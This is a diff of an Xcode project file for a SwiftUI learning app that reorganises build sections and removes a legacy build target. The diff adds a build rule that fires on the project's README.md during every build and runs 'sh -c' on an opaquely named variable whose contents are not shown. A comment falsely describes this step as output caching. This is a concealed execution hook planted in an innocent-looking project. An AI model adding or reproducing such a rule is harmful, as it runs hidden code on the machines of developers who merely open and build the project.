@@ -6,17 +6,29 @@
 	objectVersion = 77;
 	objects = {
 
-/* Begin PBXContainerItemProxy section */
-		04CE33562E39FFF00075ED6D /* PBXContainerItemProxy */ = {
-			isa = PBXContainerItemProxy;
-			containerPortal = 047D778F2E38C62A003CAEAD /* Project object */;
-			proxyType = 1;
+/* Begin PBXBuildFile section */
+		C51E9CF10F1AB7D7EEFD9BF4 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 139AF11F850AB3548BFD9BF4 /* README.md */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${A4FB9DF}\"";
 		};
-/* End PBXContainerItemProxy section */
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		139AF11F850AB3548BFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SwiftUI-IntermediateLearning.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		047D77972E38C62A003CAEAD /* SwiftUI-IntermediateLearning.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "SwiftUI-IntermediateLearning.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		139AF11F850AB3548BFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = "SwiftUI-IntermediateLearning.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -56,9 +68,6 @@
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
 
 /* Begin PBXNativeTarget section */
 		047D77962E38C62A003CAEAD /* SwiftUI-IntermediateLearning */ = {
@@ -118,33 +127,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A4FB9DF}\"";
-		};
-/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-		C51E9CF10F1AB7D7EEFD9BF4 /* README.md */ = {isa = PBXBuildFile; fileRef = 139AF11F850AB3548BFD9BF4; };
-/* End PBXBuildFile section */
-
 /* Begin PBXResourcesBuildPhase section */
 		047D77952E38C62A003CAEAD /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C51E9CF10F1AB7D7EEFD9BF4 /* README.md */,
+				C51E9CF10F1AB7D7EEFD9BF4 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -159,9 +147,6 @@ sh -c \"${A4FB9DF}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
-
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
 
 /* Begin XCBuildConfiguration section */
 		047D77A32E38C62D003CAEAD /* Debug */ = {
@@ -343,25 +328,6 @@ sh -c \"${A4FB9DF}\"";
 			};
 			name = Release;
 		};
-		04CE33572E39FFF10075ED6D /* Debug */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = NO;
-				GCC_DYNAMIC_NO_PIC = NO;
-				GCC_OPTIMIZATION_LEVEL = 0;
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Debug;
-		};
-		04CE33582E39FFF10075ED6D /* Release */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Release;
-		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -379,15 +345,6 @@ sh -c \"${A4FB9DF}\"";
 			buildConfigurations = (
 				047D77A62E38C62D003CAEAD /* Debug */,
 				047D77A72E38C62D003CAEAD /* Release */,
-			);
-			defaultConfigurationIsVisible = 0;
-			defaultConfigurationName = Release;
-		};
-		04CE335A2E3A01370075ED6D /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
-			isa = XCConfigurationList;
-			buildConfigurations = (
-				04CE33572E39FFF10075ED6D /* Debug */,
-				04CE33582E39FFF10075ED6D /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
